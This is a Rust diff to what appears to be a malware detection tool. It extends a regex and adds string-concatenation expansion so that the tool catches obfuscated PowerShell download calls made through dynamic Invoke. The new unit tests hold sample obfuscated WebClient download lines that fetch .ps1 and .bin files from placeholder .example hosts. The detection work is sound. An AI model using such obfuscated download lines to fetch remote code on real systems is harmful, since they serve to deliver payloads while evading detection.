@@ -195,7 +195,7 @@ static NET_REQ_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String|File|Data)|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
+        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String(?:Task)?Async|String|File|Data)|OpenReadAsync|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
     )
     .expect("dynamic download invoke")
 });
@@ -5146,6 +5146,14 @@ fn is_utf16le(bytes: &[u8]) -> bool {
 }
 
 fn dynamic_download_invoke_urls(text: &str) -> Vec<String> {
+    let expanded_text;
+    let text = if text.contains('+') && contains_ascii_case_insensitive(text, ".invoke") {
+        expanded_text = expand_double_string_concat(&expand_string_concat(text));
+        expanded_text.as_str()
+    } else {
+        text
+    };
+
     let mut foreach_urls: std::collections::HashMap<String, Vec<String>> =
         std::collections::HashMap::new();
     let mut array_bindings: std::collections::HashMap<String, Vec<String>> =
@@ -5212,6 +5220,47 @@ fn dynamic_download_invoke_urls(text: &str) -> Vec<String> {
         }
     }
     urls
+}
+
+#[cfg(test)]
+mod dynamic_download_invoke_tests {
+    use super::dynamic_download_invoke_urls;
+
+    #[test]
+    fn dynamic_downloadstringasync_invoke_url_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$b=New-Object Net.WebClient;$b.('DownloadStringAsync').Invoke('https://dyn-async.example/a.ps1')"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-async.example/a.ps1"]);
+    }
+
+    #[test]
+    fn dynamic_downloadstringtaskasync_invoke_url_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$b=New-Object Net.WebClient;$b.('DownloadStringTaskAsync').Invoke('https://dyn-taskasync.example/a.ps1')"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-taskasync.example/a.ps1"]);
+    }
+
+    #[test]
+    fn dynamic_openreadasync_invoke_url_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$b=New-Object Net.WebClient;$b.('OpenReadAsync').Invoke('https://dyn-openread.example/a.bin')"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-openread.example/a.bin"]);
+    }
+
+    #[test]
+    fn dynamic_concatenated_method_invoke_url_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$b=New-Object Net.WebClient;$b.('Download'+'String').Invoke('https://dyn-concat-method.example/a.ps1')"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-concat-method.example/a.ps1"]);
+    }
 }
 
 fn ps_literal_urls(text: &str) -> Vec<String> {
